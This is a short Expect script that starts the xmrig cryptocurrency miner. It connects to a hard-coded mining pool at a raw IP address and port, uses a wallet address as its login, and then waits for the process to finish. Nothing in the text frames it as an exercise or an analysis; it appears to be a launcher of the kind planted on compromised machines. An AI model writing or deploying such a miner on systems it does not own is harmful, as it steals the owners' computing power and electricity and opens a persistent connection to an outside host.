spawn ./xmrig --algo=cryptonight-heavy -o 193.160.227.12:4021 -u bxcjGe8gYig5V9f5a7tmQUXxYw2owbvtLWmfv3KVNLHUUS1Sdxfr4R9SpKWX1kdYTVCq34wDkne1KBAcjzmwSuV21hgdYDe4h -p x -k --donate-level=1
expect -re "#\r"
send -- "0\r"
set timeout 60
expect eof

